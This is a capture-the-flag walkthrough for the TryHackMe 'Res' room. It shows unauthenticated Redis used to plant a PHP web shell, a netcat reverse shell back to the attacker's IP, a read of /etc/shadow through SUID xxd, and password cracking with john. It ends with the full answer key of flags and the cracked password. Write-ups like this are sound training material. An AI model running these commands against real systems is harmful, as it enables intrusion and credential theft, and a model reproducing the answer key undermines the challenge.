# Solution

## URL
- [Res](https://tryhackme.com/room/res)

## Steps

### Enumerate
1. Start a scan on all ports using NMAP `sudo nmap -v -sS -p- -A 10.10.32.193 | tee nmap-scan.txt`.
2. There's a website running on port 80: `ffuf -u http://10.10.32.193/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -mc 200,301,302,403 -fs 11321 | tee ffuf-dir-scan.txt`.
3. Port scan results show that only 2 ports are open, `80` and `6379`.
4. Redis is running on port 6379, in the results we can see the version `6.0.7`.
5. Connect to redis with `redis-cli -h 10.10.32.193`.
6. Trying to enumerate redis databases with `INFO keyspace` returns empty list.

### Reverse shell:
1. When we opened the index page of the website it reveals the web root: `/var/www/html`.
2. We can try to use redis to upload a webshell.
3. Run these commands:
    ```
    config set dir /var/www/html
    config set dbfilename redis.php
    set test "<?php echo SYSTEM($_GET['cmd']); ?>"
    save
    ```
4. Now go to `/redis.php?cmd=whoami` and this executes the `whoami` command.
5. Since we verified this works, let's get a reverse shell. Set up a listener on port 4444: `nc -lvnp 4444`.
6. Trying bash reverse shell did not work, lets try netcat: `/redis.php?cmd=nc%20-e%20/bin/sh%2010.17.47.107%204444`. It worked~ We got a connection.
7. Enumerating a bit more we got `/home/vianka/user.txt`
8. The first flag is `thm{red1s_rce_w1thout_credent1als}`. 
9. Stabilize the shell with `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

### PrivEsc:
1. Finding all SUID binaries using: `find / -perm -u=s -type f 2>/dev/null` gives us `xxd`.
2. Using that we read `/etc/shadow`:
    ```
    LFILE=/etc/shadow
    xxd "$LFILE" | xxd -r
    ```
3. We get `vianka`'s hash: `$6$2p.tSTds$qWQfsXwXOAxGJUBuq2RFXqlKiql3jxlwEWZP6CWXm7kIbzR6WzlxHR.UHmi.hc1/TuUOUBo/jWQaQtGSXwvri0`.
4. Crack that using john:
    ```
    john --wordlist=/usr/share/wordlists/rockyou.txt hash
    john --show hash
    ```
5. We get the password: `beautiful1`.
6. Log into `vianka`'s account: `su - vianka` and enter her password.
7. Now do `sudo -l`, we caan see that we can run any command as `root`.
8. Find `root.txt` file: `sudo find / -name root.txt -type f 2> /dev/null`.
9. Found `/root/root.txt`. Reading that we get the final flag: `thm{xxd_pr1v_escalat1on}`.

### Task 1:
#### Scan the machine, how many ports are open?
1. The answer is `2`.

#### What's is the database management system installed on the server?
1. The answer is `redis`.

#### What port is the database management system running on?
1. The answer is `6379`.

#### What's is the version of management system installed on the server?
1. The answer is `6.0.7`.

#### Compromise the machine and locate user.txt
1. The answer is `thm{red1s_rce_w1thout_credent1als}`.

#### What is the local user account password?
1. The answer is `beautiful1`.

#### Escalate privileges and obtain root.txt
1. The answer is `thm{xxd_pr1v_escalat1on}`.